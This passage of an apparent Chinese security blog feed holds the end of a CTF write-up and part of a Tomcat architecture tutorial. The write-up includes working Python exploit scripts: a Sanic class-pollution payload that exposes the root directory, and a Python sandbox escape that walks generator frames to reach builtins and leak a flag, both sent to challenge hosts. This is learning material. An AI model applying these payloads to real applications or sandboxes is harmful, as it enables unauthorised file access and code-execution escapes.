的 GET 请求到 login 路由</span></span><br><span class="line">r = session.get(host + route1, proxies=proxies)</span><br><span class="line"><span class="comment"># r = session.get(host + route1)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造污染payload</span></span><br><span class="line">directory_view = &#123;</span><br><span class="line">    <span class="comment"># &quot;key&quot;:&quot;__init__\\\\.__globals__\\\\.app.router.name_index[&#x27;__mp_main__&#x27;].static.handler.keywords[&#x27;directory_handler&#x27;].directory_view&quot;,    # 这个不行，[]只能识别数字的，也就是索引</span></span><br><span class="line">    <span class="comment"># &quot;key&quot;: &quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;, # 这个也不行，这里就是不要他们转义，是同一个变量名，可以下断点</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(host+route2,json=directory_view,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="comment"># r = session.post(host+route2,json=directory_view,timeout=5)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">path_payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(host+route2,json=path_payload,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">r = session.get(host+route4,timeout=<span class="number">5</span>,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[4]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure></li></ol><h3 id="sanic-核心要点"><a href="#sanic-核心要点" class="headerlink" title="sanic: 核心要点"></a>sanic: 核心要点</h3><ol><li><em><strong>我嘞个源码题</strong></em>，疯狂看源码，但是思考的思路还是有要求的<ol><li>网上查不到就看源码，并且抓住要点，比如污染的绕过需要的是<strong>路径的解析</strong></li><li>输入无法做手脚就从解析做手脚</li></ol></li></ol><h2 id="mossfirn"><a href="#mossfirn" class="headerlink" title="mossfirn"></a>mossfirn</h2><h3 id="mossfirn-思路"><a href="#mossfirn-思路" class="headerlink" title="mossfirn: 思路"></a>mossfirn: 思路</h3><ol><li>看mossfirn源码显然是flask沙箱，哪里有亮点呢？<ol><li>使用subprocess运行命令</li><li>会将flag和id注入到运行的文件中，只要获取到flag就够了，但是这里id有什么用？</li></ol></li><li><strong>可控输入源：{id}.txt</strong>，可以获取json数据中的code</li><li>捋一捋思路<ol><li>运行runner.py时会进行字面特殊字符检查，字节码检查和特殊调用检查，这些都需要进行绕过</li><li>返回时还有一部分检查，这部分容易，直接进行编码或者断开返回即可了</li><li><strong>现在的关键目标：读取到外部的flag然后进行返回编码值</strong></li></ol></li><li>急急急急急<ol><li>搜啊搜，感觉网上的题和这里不太符合啊，都是那种链子，难道还要源码</li><li>切换一下思路，围绕“python exec中获取外部变量目的的沙盒逃逸”这个进行提问，有发现了一个栈帧逃逸的，看看<ol><li><p>还在找到了一个L3Hctf的题目很像，wc那他们不是薄纱</p></li><li><p>还是要慢下来看才可以，<strong>能出就好了，急干嘛？</strong></p></li><li><p>看讲解说是next在内置函数被禁掉了，需要用列表表达式for语句获取，本地测试如下，有几个点说一下啊</p><ol><li><strong>点1</strong>: 一个gi_frame会停在函数执行完毕的行数</li><li><strong>点2</strong>: 套了多少函数就要跳多少次，比如这里要跳到main里，需要<code>__main__&lt;-quote_caller&lt;-f</code>两个箭头跳两次</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;you got me!&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quote_caller</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame</span><br><span class="line"></span><br><span class="line">    g=f()</span><br><span class="line">    frame=[x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(frame.f_back.f_back.f_locals[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">quote_caller() <span class="comment"># 成功获取到</span></span><br></pre></td></tr></table></figure></li><li><p>这样之后就是<strong>直接往上走再读flag的情况了，找字面量这些就ok了</strong>，这里有些坑点</p><ol><li>访问的路由需要是<code>/run</code>而不能是<code>/run/</code>，第二个返回404</li><li>这里生成器要返回<code>g.gi_frame.f_back</code>才可以，如果直接返回<code>g.gi_frame</code>不可以，这里的细节放到另一篇博客里再讲《python栈帧沙箱逃逸》</li><li>这里的next()由于<code>__builtins__</code>无法直接调用，所有需要使用列表表达式进行绕过</li><li>一开始遇到了LOAD_GLOBALS问题，搜不到，顾名思义，这里使用了global的的变量，在对应的op.txt文件中检查触发点，只有一个，让他变成局部的，所以加多了一层wrapper</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://2b531651-5e31-4c7e-9a9f-42e1c62b5b8b.challenge.ctf.show/&quot;</span></span><br><span class="line">route=<span class="string">&quot;run&quot;</span></span><br><span class="line"><span class="comment"># proxies=&#123;</span></span><br><span class="line">    <span class="comment"># &quot;http&quot;: &quot;http://localhost:8080&quot;,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">payload=\</span><br><span class="line"><span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">def wrapper():</span></span><br><span class="line"><span class="string">    def evil_generator():</span></span><br><span class="line"><span class="string">      yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g=evil_generator()</span></span><br><span class="line"><span class="string">    frame = [x for x in g][0]</span></span><br><span class="line"><span class="string">    # print(frame)</span></span><br><span class="line"><span class="string">    # print(frame.f_back)</span></span><br><span class="line"><span class="string">    # print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    # print(frame.f_back.f_back.f_back)</span></span><br><span class="line"><span class="string">    func = frame.f_back.f_back.f_back.f_globals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;].str</span></span><br><span class="line"><span class="string">    res = frame.f_back.f_back.f_back.f_code.co_consts</span></span><br><span class="line"><span class="string">    for i in func(res):</span></span><br><span class="line"><span class="string">        print(i+&quot;,&quot;,end=&quot;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wrapper()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] constructing payload&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">opcodeIO = StringIO()</span><br><span class="line">dis(payload, file=opcodeIO)</span><br><span class="line">opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">opcodeIO.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] disassembling payload to op.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">open</span>(<span class="string">&quot;/home/kc1zs4/Code/CTF/op.txt&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;\n&quot;</span>.join(opcode)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] op.txt saved&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] failed to save op.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送payload</span></span><br><span class="line">r = session.post(host+route,timeout=<span class="number">5</span>,json=&#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: payload,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] get resp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取到我们的目标后就把,去掉就好</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> answer.split(<span class="string">&quot;,&quot;</span>):</span><br><span class="line">   <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h3 id="mossfirn-要点"><a href="#mossfirn-要点" class="headerlink" title="mossfirn: 要点"></a>mossfirn: 要点</h3><ol><li>比较考验实时搜搜的能力，秘塔是个好ai啊</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全6(2)_Tomcat整体架构</title>
      <link href="/2024/12/01/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/12/01/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="整体速览"><a href="#整体速览" class="headerlink" title="整体速览"></a>整体速览</h2><ol><li>前面说到，tomcat作为服务器处理的是底层的网络连接，而我们的Servlet在上面运行，我们可以注意到Servlet直接使用的是现成的HttpServletRequest和HttpServletResponse，这两个就是网络数据的封装，就是有tomcat处理网络后提供的；总的来说，tomcat有以下的功能<ol><li><strong>数据流处理</strong>：处理 Socket 连接，负责网络字节流与 Request 和 Response 对象的转化，并最终转化为HttpServletRequest和HttpServletResponse</li><li><strong>加载和管理Servlet</strong>，以及具体处理 Request 请求<br><img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_struct_abstract.png" alt="架构图"></li></ol></li><li><strong>什么是service呢？</strong><ol><li>一个容器可能对接多个连接器，就好比一个房间有多个门。但是单独的连接器或者容器都不能对外提供服务，需要把它们组装起来才能工作，组装后这个整体叫作 Service 组件</li><li>Service 只是在连接器和容器外面多包了一层，把它们组装在一起，通过在 Tomcat 中配置多个 Service，可以实现通过不同的端口号来访问同一台机器上部署的不同应用</li></ol></li><li>下面我们跟随这幅图进入到连接器中</li></ol><h2 id="1-Tomcat连接器"><a href="#1-Tomcat连接器" class="headerlink" title="1. Tomcat连接器"></a>1. Tomcat连接器</h2><h3 id="连接器的作用与流程"><a href="#连接器的作用与流程" class="headerlink" title="连接器的作用与流程"></a>连接器的作用与流程</h3><ol><li>总的来说，<strong>连接器的作用</strong>是统一处理各种网络传输协议与I&#x2F;O，并最终处理生成可供容器内部Servlet进行处理的ServletRequest对象<ol><li>网络通信，Socket这些</li><li>应用层协议解析，不同的流</li><li>Tomcat Request&#x2F;Response与ServletRequest&#x2F;ServletResponse之间的转换</li></ol></li><li>Servlet的工作流程大致如下<ol><li>外部传入数据<ol><li>网络连接: 监听网络端口，等待连接请求；接受网络连接请求；读取请求中的字节流</li><li>解析：根据具体应用层协议（HTTP&#x2F;APR）解析字节流，生成统一的Tomcat Request对象</li><li>转换：将Tomcat Request对象转换成标准的ServletRequest提交给Servlet容器</li></ol></li><li>内部传出数据<ol><li>调用Servlet容器，得到ServletResponse</li><li>将ServletResponse转换成Tomcat Response对象</li><li>将Tomcat Response转成网络字节流进行发送</li></ol></li></ol></li></ol><h3 id="连接器的内部构成"><a href="#连接器的内部构成" class="headerlink" title="连接器的内部构成"></a>连接器的内部构成</h3><ol><li>上面说到tomcat连接器有三个大的作用，Tomcat的设计者设计了3个组件来实现这三个功能：Endpoint、Processor和Adapter，他们的具体结构如下<br><img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_connecter_struct.png" alt="tomcat连接器内部构成"><ol start="2"><li>Endpoint负责字节流：Endpoint负责提供字节流给Processor处理</li><li>Processor负责解析：Processor处理好之后提供Tomcat Request对象给Adapter</li><li>Adapter负责转换：Adapter将Tomcat Request对象转成标准的ServletRequest提供给Servlet容器</li></ol></li></ol><h3 id="ProtocolHandler组件"><a href="#ProtocolHandler组件" class="headerlink" title="ProtocolHandler组件"></a>ProtocolHandler组件</h3><ol><li>Tomcat中连接器使用ProtocolHandler来处理网络连接和应用层协议，主要包含Endpoint和Processor</li><li>Endpoint<ol><li>具体职责：Endpoint是通信端点，是具体的Socket接收和发送处理器，是对传输层的抽象，所以Endpoint是用来<strong>实现TPC&#x2F;IP协议的</strong><br><img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_endpoint_tree.png" alt="pic"><ol><li>AbstractEndpoint是Endpoint对应的抽象接口，具体的实现类有NioEndpoint和Nio2Endpoint，有两个重要的子组件Acceptor和SocketProcessor<ol><li>Acceptor是用来监听Socket连接请求</li><li>SocketProcessor用来处理接收到的Socket请求，它实现了Runnable接口，在run方法中调用协议处理组件Processor进行处理，SocketProcessor被提交到线程池中执行</li></ol></li></ol></li></ol></li><li>Processor<ol><li>具体职责：Processor是用来实现HTTP协议，是对应应用层协议的抽象，Processor接受来自Endpoint的Socket，解析成Tomcat Request和Response对象，并通过Adapter提交到容器中<br> <img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_processor_tree.png" alt="pic"><ol><li>Processor是个接口，定义了请求的处理等方法。它的抽象实现类 AbstractProcessor 对一些协议共有的属性进行封装，没有对方法进行实现。具体的实现有 AJPProcessor、HTTP11Processor 等，这些具体实现类实现了特定协议的解析方法和请求处理方式</li></ol></li></ol></li><li>ProtocolHandler<br><img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_protocolhandler_flow.png" alt="pic"><ol><li><strong>通过组合实现</strong>: EndPoint 接收到 Socket 连接后，生成一个 SocketProcessor 任务提交到线程池去处理，SocketProcessor 的 Run 方法会调用 Processor 组件去解析应用层协议，Processor 通过解析生成 Request 对象后，会调用Adapter 的 Service 方法</li></ol></li></ol><h3 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h3><ol><li>到了这一步，还需要进行转换ServletRequest</li><li><strong>ProtocolHandler接口的结果</strong>: 解析请求并生成 Tomcat Request 类。但是这个 Request 对象不是标准的 ServletRequest，也就意味着，不能用 Tomcat Request 作为参数来调用容器</li><li><strong>CoyoteAdapter</strong>:j这是适配器模式的经典运用，连接器调用 CoyoteAdapter 的 Sevice 方法，传入的是 Tomcat Request 对象，CoyoteAdapter 负责将 Tomcat Request 转成 ServletRequest，再调用容器的 Service 方法</li></ol><h3 id="最后再说下Tomcat的网络支持"><a href="#最后再说下Tomcat的网络支持" class="headerlink" title="最后再说下Tomcat的网络支持"></a>最后再说下Tomcat的网络支持</h3><ol><li>Tomcat 支持的 I&#x2F;O 模型有<ol><li>NIO：非阻塞 I&#x2F;O，采用 Java NIO 类库实现。</li><li>NIO2：异步 I&#x2F;O，采用 JDK 7 最新的 NIO2 类库实现。</li><li>APR：采用 Apache 可移植运行库实现，是 C&#x2F;C++ 编写的本地库。</li></ol></li><li>Tomcat 支持的应用层协议有<ol><li>HTTP&#x2F;1.1：这是大部分 Web 应用采用的访问协议。</li><li>AJP：用于和 Web 服务器集成（如 Apache）。</li><li>HTTP&#x2F;2：HTTP 2.0 大幅度的提升了 Web 性能。</li></ol></li></ol><h2 id="2-Servlet容器"><a href="#2-Servlet容器" class="headerlink" title="2. Servlet容器"></a>2. Servlet容器</h2><h3 id="Servlet容器的结构"><a href="#Servlet容器的结构" class="headerlink" title="Servlet容器的结构"></a>Servlet容器的结构</h3><ol><li><p>Tomcat 设计了 4 种容器，分别是 Engine、Host、Context 和 Wrapper。这 4 种容器不是相互独立的关系，而是父子关系，逐层包含<br> <img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_container_struct.png" alt="pic"></p></li><li><p>容器间对应关系如下图所示<br> <img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_container_mapping.png" alt="pic"></p><ol><li>一个Service最多只能有一个Engine</li><li>一个Engine可以管理多台host（虚拟主机）</li><li>一个host下可以部署多部context，一个context表示一个web应用</li><li>一个context下可以有多个wrapper，一个wrapper就是一个servlet</li><li>wrapper对servlet进行包装，管理生命周期等</li></ol></li><li><p>这里的关系可以在tomcat中的server.xml配置文件中体现</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 顶层组件，可以包含多个Service --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- 顶层组件，可以包含一个Engine，多个连接器 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- HTTP协议的连接器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- AJP协议的连接器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 一个Engine组件处理Service中的所有请求 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> <span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 处理特定的Host下的请求，可以包含多个Context --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">context</span>&gt;</span><span class="tag">&lt;/<span class="name">context</span>&gt;</span> <span class="comment">&lt;!-- 为特定的Web应用处理所有的请求 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>补充一点设计思想吧</p><ol><li><p>由于Tomcat中的这些容器是父子的包含关系，最后会形成一个树状结构，<strong>这就是设计模式中的组合模型</strong>，Tomcat就是通过组合模式来管理这些容器的</p></li><li><p>所有的容器组件都实现了Container接口，因此组合模式可以使得用户对但容器对象和组合溶剂对象的使用具有一致性。这里但容器对象是指最底层的Wrapper，组合容器对象指的是Wrapper之上的Context、Host或者Engine</p></li><li><p>给个Container的接口</p><ol><li>Container 接口扩展了 LifeCycle 接口，LifeCycle 接口用来统一管理各组件的生命周期</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Container</span> <span class="keyword">extends</span> <span class="title class_">Lifecycle</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">public</span> Container <span class="title function_">getParent</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParent</span><span class="params">(Container container)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addChild</span><span class="params">(Container child)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeChild</span><span class="params">(Container child)</span>;</span><br><span class="line">    <span class="keyword">public</span> Container <span class="title function_">findChild</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="Servlet容器工作流程"><a href="#Servlet容器工作流程" class="headerlink" title="Servlet容器工作流程"></a>Servlet容器工作流程</h3><ol><li><strong>定位工作</strong>: 在这么多个容器组合使用时，最重要的是确定请求要到达哪一个Servlet中进行处理</li><li><strong>Mapper组件</strong><ol><li>Mapper里保存了Web应用的配置信息，就是容器组件与访问路径的映射关系，这里再用用老图<br> <img src="/pic/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/tomcat_container_mapping.png" alt="pic"><ol><li>Host容器里配置的域名</li><li>Context容器里的Web应用路径</li><li>以及Wrapper容器里Servlet映射的路径</li></ol></li><li>S1: 根据协议和端口号选定 Service 和 Engine<ol><li>Tomcat 的每个连接器都监听不同的端口，而一个连接器是属于一个 Service 组件的，一个 Service 组件里除了有多个连接器，还有一个容器组件，具体来说就是一个 Engine 容器，因此 Service 确定了也就意味着 Engine 也确定了</li></ol></li><li>S2: 根据域名选定 Host</li><li>S3: 根据 URL 路径找到 Context 组件</li><li>S4: 根据 web.xml 找到 Wrapper（Servlet）<ol><li>Context 确定后，Mapper 再根据 web.xml 中配置的 Servlet 映射路径来找到具体的 Wrapper 和 Servlet</li></ol></li></ol></li></ol><h3 id="责任链模式实现定位原理"><a href="#责任链模式实现定位原理" class="headerlink" title="责任链模式实现定位原理"></a>责任链模式实现定位原理</h3><ol><li><p>连接器先处理请求后，最先拿到请求的是 Engine 容器，Engine 容器对请求做一些处理后，会把请求传给自己子容器 Host 继续处理，依次类推，最后这个请求会传给 Wrapper 容器，Wrapper 会调用最终的 Servlet 来处理  –&gt; <strong>使用Pipeline-Valve管道来实现</strong></p></li><li><p><strong>什么是责任链?A: 类似链表</strong>：责任链模式是指在一个请求处理的过程中有很多处理者依次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后将再调用下一个处理者继续处理</p></li><li><p><strong>Pipline-Value</strong></p><ol><li><p>Valve接口如下，Valve 是一个处理点，因此 invoke 方法就是来处理请求的。 Valve 中有 getNext 和 setNext 方法 –&gt; 类似于链表中的节点</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span 